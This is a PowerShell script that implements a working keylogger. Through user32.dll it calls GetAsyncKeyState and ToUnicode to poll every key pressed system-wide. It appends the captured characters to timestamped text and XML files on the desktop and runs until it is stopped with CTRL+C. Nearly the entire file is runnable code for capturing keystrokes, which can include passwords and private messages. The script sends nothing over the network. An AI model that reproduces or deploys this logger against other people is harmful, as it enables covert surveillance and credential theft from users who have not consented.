# function records keystrokes both in txt and xml files.
function KeyLogger()
{
	$Path = "C:\Users\decoder\Desktop\KeyLogger $(get-date -UFormat "%m.%d.%Y.%H.%M.%S").txt"
	$XML_Path = "C:\Users\decoder\Desktop\KeyLogger $(get-date -UFormat "%m.%d.%Y.%H.%M.%S").xml"
	$first_time = 0
	#$totalNumber = 0

	# Create the XML File Tags
	$xmlWriter = New-Object System.XMl.XmlTextWriter($XML_Path,$Null)
	$xmlWriter.Formatting = 'Indented'
	$xmlWriter.Indentation = 1
	$XmlWriter.IndentChar = "`t"
	$xmlWriter.WriteStartDocument()
	$xmlWriter.WriteComment('Get the Information about pressed keys')
	$xmlWriter.WriteStartElement('KEYLOGGER')
	$xmlWriter.WriteEndElement()
	$xmlWriter.WriteEndDocument()
	$xmlWriter.Flush()
	$xmlWriter.Close()

	 # Signatures for API Calls
  	$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
	# load signatures and make members available
	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
	# create output file
	$null = Ni -Path $Path -ItemType File -Force

	try
	{
		Write-Host 'Keylogger is working...'   -ForegroundColor Green 
		Write-Host '(Press CTRL+C to stop.)'   -ForegroundColor gray

		# create endless loop,collect pressed keys, CTRL+C to exit
		while ($true)
		{
			Start-Sleep -Milliseconds 20
      
			# scan  ASCII codes between 8 and 128
			for ($ascii = 9; $ascii -le 128; $ascii++) 
			{
				# get current key state
				$state = $API::GetAsyncKeyState($ascii)
				# is key pressed?
				if ($state -eq -32767) 
				{
					$null = [console]::CapsLock

					# translate scan code to real code
					$virtualKey = $API::MapVirtualKey($ascii, 3)

					# get keyboard state for virtual keys
					$kbstate = New-Object Byte[] 256
					$checkkbstate = $API::GetKeyboardState($kbstate)

					# prepare a StringBuilder to receive input key
					$mychar = New-Object -TypeName System.Text.StringBuilder

					# translate virtual key
					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

					if ($success) 
          				{
						# add key to logger file
						[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 

						if($first_time){
							# Create the Initial  Node
							$xmlDoc = [System.Xml.XmlDocument](Get-Content $XML_Path);
							$keyNode = $xmlDoc.CreateElement("KEYSTROKE")
							$button = $xmlDoc.SelectSingleNode("//KEYLOGGER").AppendChild($keyNode)
							$button.setAttribute("Button",$mychar)
							$button.setAttribute("Time",$(get-date -format g))
							$xmlDoc.Save($XML_Path)	
							#$totalNumber++
						}
					$first_time = 1	    
          				}
        			}
      			}
    		}
  	}
  	finally
  	{
		write-Host "Total Number of Keystrokes are " -ForegroundColor Green 
	}
}

# records all key presses until script is aborted by pressing CTRL+C
KeyLogger
